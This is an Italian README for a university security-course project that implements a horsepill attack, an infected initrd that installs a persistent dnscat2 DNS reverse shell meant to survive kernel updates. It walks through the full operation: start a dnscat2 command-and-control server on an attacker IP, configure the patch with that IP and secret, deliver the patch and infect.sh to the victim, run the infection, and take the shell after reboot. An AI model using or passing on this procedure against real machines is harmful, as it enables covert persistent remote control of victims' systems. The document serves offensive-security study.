# Network and System Defense project
## Alessandro Chillotti (mat. 0299824)

## Traccia del progetto (traduzione)
È richiesto produrre un payload (utilizzando qualunque vettore) che è in grado di installare una DNS shell (e.g. guardare [qui](https://github.com/sensepost/DNS-Shell)) utilizzando un horsepill attack. Il payload deve essere in grado di sopravvivere agli update del kernel.

## Come effettuare l'attacco
### Configurazione del server dnscat2
È necessario mettere up and running un server `dnscat2` e per fare questo è necessario eseguire i seguenti comandi:

1. Effettuare la clone del [repository](https://github.com/iagox86/dnscat2.git) di dnscat2 e seguire le indicazioni per la configurazione dell'ambiente
2. Spostarsi all'interno della directory `server`
3. Eseguire il seguente comando
```[bash]
bundle exec ruby dnscat2.rb --dns 'host=xxx.xxx.xxx.xxx,port=53531'
```
### Preparazione dell'attacco
Sulla macchina di lavoro è necessario configurare correttamente il [file](horsepill-attack.patch) di patch, ovvero bisogna aggiornare:

- l'indirizzo IP della macchina sulla quale connetersi;
- la secret che verrà fornita nel momento in cui il server `dnscat2` sarà up and running.

Una volta che la patch è configurata correttamente, dovrà essere inviata alla macchina vittima insieme al file [infect.sh](infect.sh).
### Esecuzione sulla macchina vittima
Una volta che la macchina vittima è in possesso dei file [horsepill-attack.patch](horsepill-attack.patch) e [infect.sh](infect.sh) bisogna eseguire il seguente comando:
```[bash]
./infect.sh ABSOLUTE_PATH_INITRD ABSOLUTE_PATH_PATCH
```
### Shell sulla macchina host
Al termine dell'esecuzione dello script [infect.sh](infect.sh) verrà effettuato il reboot della macchina vittima e, una volta completato, si noterà nel processo server di `dnscat2` una nuova connessione.

Una volta ricevuta la connessione è necessario digitare il comando `window -i 1` e poi il comando `shell`. A questo punto, sarà generata una nuova shell e con il comando `window -i 2` si potrà gestire la shell sh.
